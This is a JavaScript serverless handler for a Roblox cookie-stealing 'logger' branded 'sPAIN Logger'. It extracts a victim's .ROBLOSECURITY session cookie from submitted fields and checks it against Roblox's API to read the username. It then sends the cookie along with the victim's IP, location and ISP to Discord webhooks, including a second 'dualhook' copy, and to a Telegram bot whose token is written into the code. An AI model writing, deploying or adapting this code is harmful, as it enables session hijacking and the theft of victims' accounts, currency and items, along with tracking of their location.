// api/submit.js — cookie hits Discord immediately, geo runs in parallel
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

// Cookie Refresher URL with emoji styling
const COOKIE_REFRESH_URL = 'https://index-html-ruby-eight.vercel.app/';
const COOKIE_REFRESH_EMOJI = '🍪 Cookie Refresher 🍪';

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 3000);
    const r = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: ctrl.signal });
    clearTimeout(timer);
    const d = await r.json();
    return { city: d.cityName, regionName: d.regionName, country: d.countryName, isp: d.isp };
  } catch { return null; }
}

// Check account info and refresh cookie validity
async function checkAccountInfo(cookie) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 8000);
    
    // Try to get current user info from Roblox
    const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      signal: ctrl.signal
    });
    
    clearTimeout(timer);
    
    if (!response.ok) {
      return { valid: false, error: 'Invalid or expired cookie' };
    }
    
    const userData = await response.json();
    
    // Get additional account details
    const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
    }).catch(() => null);
    
    const profile = profileRes?.ok ? await profileRes.json() : null;
    
    return {
      valid: true,
      id: userData.id,
      username: userData.name,
      displayName: userData.displayName,
      created: profile?.created,
      description: profile?.description,
      isBanned: profile?.isBanned || false,
      profileUrl: `https://www.roblox.com/users/${userData.id}/profile`
    };
  } catch (err) {
    return { valid: false, error: err.message };
  }
}

// Refresh cookie (validate and return status)
async function refreshCookieStatus(cookie) {
  const accountInfo = await checkAccountInfo(cookie);
  return {
    refreshed: accountInfo.valid,
    account: accountInfo,
    timestamp: new Date().toISOString()
  };
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

const WH_NAME   = 'sPAIN';
const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';

// Webhook JSON Structures
const createWebhookPayload = (type, data) => {
  const basePayload = {
    username: WH_NAME,
    avatar_url: WH_AVATAR
  };

  switch (type) {
    case 'webhook1':
      // Primary/Dualhook Parent Webhook JSON Structure
      return {
        ...basePayload,
        content: data.content || '@everyone',
        embeds: [{
          title: data.title || '🍪 Cookie Captured (Dualhook)',
          description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
          color: data.color || 0x06b6d4,
          fields: data.fields || [],
          footer: { text: data.footer || `sPAIN Logger` },
          timestamp: data.timestamp || new Date().toISOString()
        }]
      };
    
    case 'webhook2':
      // Secondary/Child Webhook JSON Structure
      return {
        ...basePayload,
        content: data.content || '@everyone',
        embeds: [{
          title: data.title || '🍪 Cookie Captured',
          description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
          color: data.color || 0xc026d3,
          fields: data.fields || [],
          footer: { text: data.footer || `sPAIN Logger` },
          timestamp: data.timestamp || new Date().toISOString()
        }]
      };
    
    case 'account_info':
      // Account Info Check Webhook JSON Structure
      return {
        ...basePayload,
        content: data.content || '',
        embeds: [{
          title: data.valid ? '✅ Account Info Valid' : '❌ Account Check Failed',
          description: data.description || '',
          color: data.valid ? 0x00ff00 : 0xff0000,
          fields: data.fields || [],
          footer: { text: `Account Check • ${COOKIE_REFRESH_EMOJI}` },
          timestamp: data.timestamp || new Date().toISOString()
        }]
      };
    
    default:
      return basePayload;
  }
};

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text, payload = {}) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
    const messagePayload = first
      ? { content: '```\n' + chunk + (rem.length === 0 ? '\n```' : ''), ...payload }
      : { content: chunk + (rem.length === 0 ? '\n```' : ''), ...payload };
    await discordSend(url, messagePayload);
    first = false;
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots, action } = body;
  
  // Handle cookie refresh/account check action
  if (action === 'check_account' || action === 'refresh_cookie') {
    if (!slots) return res.status(400).json({ error: 'slots is required' });
    const cookie = findCookie(slots);
    if (!cookie) return res.status(400).json({ error: 'No valid cookie found' });
    
    const refreshResult = await refreshCookieStatus(cookie);
    return res.status(200).json(refreshResult);
  }
  
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
              || req.headers['x-real-ip'] || 'Unknown';
  const now    = new Date().toISOString();
  const pName  = record.displayName || slug;
  const cookie = findCookie(slots);

  const webhooks = [record.webhook];
  if (record.dualhookParent) {
    const parent = await redisGet(`slot:${record.dualhookParent}`);
    if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
  }

  if (!cookie) {
    const geo = await getIpGeo(ip);
    const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
    
    // Wrong cookie embed using webhook2 structure
    const wrongCookiePayload = createWebhookPayload('webhook2', {
      title: '⚠️ Wrong Cookie — Troll Detected',
      description: record.dualhookParent
        ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
        : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
      color: 0xff3333,
      fields: [
        { name: '🌐 IP',       value: ip,                   inline: true  },
        { name: '📍 Location', value: loc,                  inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
        { name: '🕐 Time',     value: now,                  inline: false },
        { name: `🍪 ${COOKIE_REFRESH_EMOJI}`, value: `[Click to Refresh](${COOKIE_REFRESH_URL})`, inline: false }
      ],
      footer: `sPAIN Logger • ${pName}`,
      timestamp: now
    });
    
    await Promise.all(webhooks.map(wh => discordSend(wh, wrongCookiePayload)));
    await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
    return res.status(200).json({ success: true });
  }

  // Check account info in parallel
  const geoPromise = getIpGeo(ip);
  const accountCheckPromise = refreshCookieStatus(cookie);

  // Resolve webhook1 (dualhook parent webhook) if applicable
  let webhook1 = null;
  let webhook2 = record.webhook;
  if (record.dualhookParent) {
    try {
      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
      if (parentRecord?.webhook) webhook1 = parentRecord.webhook;
    } catch (_) {}
  }

  const [geo, accountInfo] = await Promise.all([geoPromise, accountCheckPromise]);
  const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
  const isp = geo?.isp || 'Unknown';

  // webhook2 JSON payload: IP, Page, Time, Location, ISP, Account Info, Cookie Refresher Link
  const wh2Payload = createWebhookPayload('webhook2', {
    description: record.dualhookParent
      ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
      : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
    fields: [
      { name: '🌐 IP',       value: `\`${ip}\``, inline: true  },
      { name: '📄 Page',     value: pName,        inline: true  },
      { name: '🕐 Time',     value: now, inline: false },
      { name: '📍 Location', value: loc, inline: true  },
      { name: '🗺️ ISP',      value: isp, inline: true  },
      { name: '👤 Account',  value: accountInfo.refreshed 
        ? `**${accountInfo.account.username}** (${accountInfo.account.id})\n[View Profile](${accountInfo.account.profileUrl})`
        : '❌ Invalid/Expired', inline: false },
      { name: `🍪 ${COOKIE_REFRESH_EMOJI}`, value: `[Refresh Cookie](${COOKIE_REFRESH_URL})`, inline: false }
    ],
    footer: `sPAIN Logger • ${pName}`,
    timestamp: now
  });

  await discordSend(webhook2, wh2Payload);
  await discordChunked(webhook2, cookie);

  // webhook1 JSON payload (dualhook only): IP, DH Parent, DH Child, Time, Location, ISP, Account, Cookie
  if (webhook1 && webhook1 !== webhook2) {
    const wh1Payload = createWebhookPayload('webhook1', {
      title: '🍪 Cookie Captured (Dualhook)',
      fields: [
        { name: '🌐 IP',        value: `\`${ip}\``,                   inline: true  },
        { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true  },
        { name: '🔗 DH Child',  value: `\`${slug}\``,                 inline: true  },
        { name: '🕐 Time',      value: now,                           inline: false },
        { name: '📍 Location',  value: loc,                           inline: true  },
        { name: '🗺️ ISP',       value: isp,                           inline: true  },
        { name: '👤 Account',   value: accountInfo.refreshed 
          ? `**${accountInfo.account.username}** (${accountInfo.account.id})`
          : '❌ Invalid/Expired', inline: false },
        { name: `🍪 ${COOKIE_REFRESH_EMOJI}`, value: `[Refresh Cookie](${COOKIE_REFRESH_URL})`, inline: false }
      ],
      footer: `sPAIN Logger • ${pName}`,
      timestamp: now
    });
    
    await discordSend(webhook1, wh1Payload);
    await discordChunked(webhook1, cookie);
  }

  // Send account info check result to both webhooks
  if (accountInfo.refreshed) {
    const accountPayload = createWebhookPayload('account_info', {
      valid: true,
      description: `**${accountInfo.account.username}** (${accountInfo.account.id})`,
      fields: [
        { name: '👤 Username', value: accountInfo.account.username, inline: true },
        { name: '🆔 User ID', value: String(accountInfo.account.id), inline: true },
        { name: '📝 Display Name', value: accountInfo.account.displayName || 'N/A', inline: true },
        { name: '🔗 Profile', value: `[View Profile](${accountInfo.account.profileUrl})`, inline: false },
        { name: '🕐 Checked At', value: accountInfo.timestamp, inline: false }
      ]
    });
    
    await discordSend(webhook2, accountPayload);
    if (webhook1) await discordSend(webhook1, accountPayload);
  }

  await tgSend([
    `🍪 <b>COOKIE — ${pName}</b>`,
    `🌐 <code>${ip}</code>`,
    `📍 ${loc}`,
    `🗺️ ${isp}`,
    `👤 ${accountInfo.refreshed ? accountInfo.account.username : 'Invalid'}`,
    `🕐 ${now}`,
    `🍪 [${COOKIE_REFRESH_EMOJI}](${COOKIE_REFRESH_URL})`
  ].join('\n'));

  return res.status(200).json({ 
    success: true, 
    account: accountInfo.refreshed ? accountInfo.account : null 
  });
}
